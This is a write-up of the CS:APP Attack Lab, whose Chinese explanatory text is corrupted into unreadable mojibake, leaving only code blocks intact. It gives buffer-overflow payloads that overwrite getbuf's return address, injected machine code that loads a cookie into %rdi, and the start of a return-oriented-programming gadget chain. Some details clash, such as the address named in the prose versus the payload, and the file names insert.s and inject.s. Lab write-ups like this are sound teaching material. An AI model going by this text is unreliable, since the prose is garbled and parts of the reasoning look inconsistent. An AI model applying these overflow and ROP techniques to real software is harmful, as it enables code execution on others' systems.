# Attacklab ʵ�ֱʼ�

### 1.׼������

&emsp;&emsp;���ȶ�ctarget��rtarget�ļ�ִ�з����ָ�

```bash
objdump -d ctarget > ctarget.asm
objdump -d rtarget > rtarget.asm
```

&emsp;&emsp;��������Ĺ����ַ�����Ҫͨ�����·�������ctarget/rtarget�У�

```bash
./hex2raw < ctarget.l2.txt | ./ctarget -q
```

&emsp;&emsp;���ǵĹ���������³���
```C
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}

void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

&emsp;&emsp;����ϣ������`test`������ʹ����ִ��`getbuf()`��ִ������ֲ��ĺ�����Ȼ����ֹ���У�������ִ��`printf`ָ�

### 2.����ֲ�빥��

#### &emsp;&emsp;$a.$phase 1

&emsp;&emsp;�׶�һ��Ҫֲ��ĺ������£�

```C
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

&emsp;&emsp;�ڷ�����õ���`ctarget.asm`�У�`touch1`��Ӧ��������£�

```assembly
00000000004017c0 <touch1>:
......
```

&emsp;&emsp;�ú���������Ҫ�������Ĳ���������ֻ�轫�ú����ĵ�ַ����`getbuf`�ķ��ص�ַ���ɡ�

&emsp;&emsp;��Ϊ�˸���`getbuf`�ķ��ص�ַ��������Ҫ**����`getbuf`�����Ļ�������Ȼ�󽫻�������װ�ط��ص�ַ�Ĳ�������`touch1`�ĵ�ַ**��

&emsp;&emsp;��`ctarget.asm`�У�`getbuf`��Ӧ���������£�

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp     # open stack
  4017ac:	48 89 e7             	mov    %rsp,%rdi      # rdi = rsp
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>  # getstring
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

&emsp;&emsp;���Կ���`getbuf`�Ļ�������СΪ0x28����40������ֻ���������ַ�����仺������Ȼ��ջ֡λ�õķ��ص�ַ��Ϊ`4017a8`���ɣ�

```txt
00 00 00 00 00 00 00 00 # (%rsp)
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 # (%rbp)
```

> ע�⵽ʵ�����little-endian��������Ҫ�ѵ�ַ������д��

#### &emsp;&emsp;$b.$Phase 2

&emsp;&emsp;�׶ζ���Ҫֲ��ĺ������£�

```C
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie)
    {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }
    else
    {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

&emsp;&emsp;���Ӧ���������£�

```assembly
00000000004017ec <touch2>:
......
```

&emsp;&emsp;��C������֪��������Ҫ�������`val`�����Ҹò�����`cookie`��ȡ�Ϊ�ˣ�����ֲ�����´��루`insert.s`����

```assembly
push $0x4017ec         
mov $0x59b997fa,%rdi   # the first argument equals to cookie
ret                    # return
```

> ����`ret`�ᵯ��ջ�е�ֵ����ת���õ�ַ���������Ƚ�`touch2`�ĵ�ַ`push`��ջ�У�����`ret`��ͻ�ִ��`touch2`�ˡ�

&emsp;&emsp;Ϊ���ܹ�˳��ִ��ֲ����룬����**��ֲ��������ջ�ף�`%rsp`���ڵ�ַ����Ȼ��`getbuf`ԭ�еķ��ص�ַ����Ϊ`%rsp`��ַ����**��

&emsp;&emsp;Ϊ��ȡ`%rsp`��ַ�����������µ�gdbָ��ڽ���`Gets`������λ�����öϵ㣺

![](image.png)

&emsp;&emsp;�����������ڶ����ǵ�ֲ�������з���������

```bash
gcc -c inject.s
objdump -d inject.o
```

&emsp;&emsp;���ɽ��õ��Ľ����

```txt
68 ec 17 40 00 48 c7 c7
fa 97 b9 59 c3
```

&emsp;&emsp;����ջ�С�����������ַ������£�

```txt
68 ec 17 40 00 48 c7 c7 # (%rsp)
fa 97 b9 59 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # (%rbp)
```

> ��`%rsp`�ĵ�ַ����ջ֡��λ��Ҳ��������`ret`�����ԣ�`getbuf`�����`ret`ʱ���԰�ջ��ʣ�µ������ַ���������ѳ���Ŀ���Ȩ��������

#### &emsp;&emsp;$c.$Phase 3

&emsp;&emsp;�׶�����Ҫֲ��ĺ������£�

```C
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval))
    {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    }
    else
    {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

&emsp;&emsp;���ȵõ�cookie��ASCII��ʾ��little-endian����35 39 62 39 39 37 66 61.

&emsp;&emsp;Ȼ�󣬸�����Ŀ��ʾ������Ӧ�ð�`%rdi`����Ϊ�ַ���ָ��ĵ�ַ�����ڴ��д洢���ַ�����ֵ����cookie��ASCII��ʾ��

&emsp;&emsp;Ϊ�˵õ��õ�ַ�����ǹ۲�`getbuf`�е��õĶ�ȡ�ַ����ĺ���`Gets`��

```assembly
0000000000401a40 <Gets>:
  401a40: 41 54                 push   %r12
  401a42: 55                    push   %rbp
  401a43: 53                    push   %rbx
  401a44: 49 89 fc              mov    %rdi,%r12
  401a47: c7 05 b3 36 20 00 00  movl   $0x0,0x2036b3(%rip)        # 605104 <gets_cnt>
  401a4e: 00 00 00 
  401a51: 48 89 fb              mov    %rdi,%rbx
  401a54: eb 11                 jmp    401a67 <Gets+0x27>
  401a56: 48 8d 6b 01           lea    0x1(%rbx),%rbp
  401a5a: 88 03                 mov    %al,(%rbx)
  401a5c: 0f b6 f8              movzbl %al,%edi
  401a5f: e8 3c ff ff ff        callq  4019a0 <save_char>
  401a64: 48 89 eb              mov    %rbp,%rbx
  401a67: 48 8b 3d 62 2a 20 00  mov    0x202a62(%rip),%rdi        # 6044d0 <infile>
  401a6e: e8 4d f3 ff ff        callq  400dc0 <_IO_getc@plt>
  401a73: 83 f8 ff              cmp    $0xffffffff,%eax
  401a76: 74 05                 je     401a7d <Gets+0x3d>
  401a78: 83 f8 0a              cmp    $0xa,%eax
  401a7b: 75 d9                 jne    401a56 <Gets+0x16>
  401a7d: c6 03 00              movb   $0x0,(%rbx)
  401a80: b8 00 00 00 00        mov    $0x0,%eax
  401a85: e8 6e ff ff ff        callq  4019f8 <save_term>
  401a8a: 4c 89 e0              mov    %r12,%rax
  401a8d: 5b                    pop    %rbx
  401a8e: 5d                    pop    %rbp
  401a8f: 41 5c                 pop    %r12
  401a91: c3                    retq
```

&emsp;&emsp;���Կ�����������`save_char`�������������Ӧ�������ڱ����ַ���λ�õġ������ٹ۲�`save_char`�ķ������룺

```assembly
00000000004019a0 <save_char>:
  4019a0:	8b 05 5e 37 20 00    	mov    0x20375e(%rip),%eax        # 605104 <gets_cnt>
  4019a6:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  4019ab:	7f 49                	jg     4019f6 <save_char+0x56>
  4019ad:	8d 14 40             	lea    (%rax,%rax,2),%edx
  4019b0:	89 f9                	mov    %edi,%ecx
  4019b2:	c1 e9 04             	shr    $0x4,%ecx
  4019b5:	48 63 c9             	movslq %ecx,%rcx
  4019b8:	0f b6 b1 b0 34 40 00 	movzbl 0x4034b0(%rcx),%esi
  4019bf:	48 63 ca             	movslq %edx,%rcx
  4019c2:	40 88 b1 00 45 60 00 	mov    %sil,0x604500(%rcx)
  4019c9:	8d 4a 01             	lea    0x1(%rdx),%ecx
  4019cc:	83 e7 0f             	and    $0xf,%edi
  4019cf:	0f b6 b7 b0 34 40 00 	movzbl 0x4034b0(%rdi),%esi
  4019d6:	48 63 c9             	movslq %ecx,%rcx
  4019d9:	40 88 b1 00 45 60 00 	mov    %sil,0x604500(%rcx)
  4019e0:	83 c2 02             	add    $0x2,%edx
  4019e3:	48 63 d2             	movslq %edx,%rdx
  4019e6:	c6 82 00 45 60 00 20 	movb   $0x20,0x604500(%rdx)
  4019ed:	83 c0 01             	add    $0x1,%eax
  4019f0:	89 05 0e 37 20 00    	mov    %eax,0x20370e(%rip)        # 605104 <gets_cnt>
  4019f6:	f3 c3                	repz retq 
```

&emsp;&emsp;���Կ���`mov`�������յ��ƫ�ƴ󲿷�Ϊ`0x604500`�������ܴ�����Ǵ洢�ַ�����ָ��Ļ���ַ��

&emsp;&emsp;���������ǾͿ���д������ֲ����룺

```assembly
pushq $0x4018fa
mov $0x604500,%rdi          # the string pointer's address, where the result of Gets is stored
movq $0x39623935,(%rdi)
movq $0x61663739,0x4(%rdi)
ret
```

&emsp;&emsp;ʣ�ಿ�ֺͽ׶ζ����ƣ����յõ����ַ������£�

```txt
68 fa 18 40 00 48 c7 c7
00 45 60 00 48 c7 07 35 
39 62 39 48 c7 47 04 39 
37 66 61 c3 00 00 00 00 
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

### 3.���ص�����(ROP)

&emsp;&emsp;ROP(Return-Oriented Programming)ͨ��ʶ�����г��������е��ֽ�������ʵ�ֹ�������Щ�ֽ����а���һЩ���ָ���Ѿ���β��`ret`����Щ�ֽ����б�����С���ߣ�gadget��

&emsp;&emsp;С���߿���**ʹ������������ɵĻ����������Ӧ�Ĵ���**����Ȼ����С���߲�����ʵ����Ч�Ĺ���������ͨ����С����������������ǿ��Դﵽ��ֲ�����һ����Ч����

#### &emsp;&emsp;$a.$Phase 4

&emsp;&emsp;������ʾ��ʶ�����Ҫ��С�������£�

```assembly
# movq %rax %rdi
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

# gadget movq %rax %rdi
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

# gadget popq %rax
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq  
```

&emsp;&emsp;������ЩС���߲�û��ʵ��`ret`�����������Ҫ�ñ�ķ�������cookie��ֵ����`%rdi`�У�

1. ִ��`popq %rax`��Ȼ���cookie��ASCIIֵ�Ž�ջ�С�����`%rax`�оʹ�����Ҫ��ֵ�ˡ�

2. ִ��`movq %rax %rdi`��

3. ����`touch2`������`touch2`�Ϳ�����`%rdi`�е�ֵ��Ϊ�����ˡ�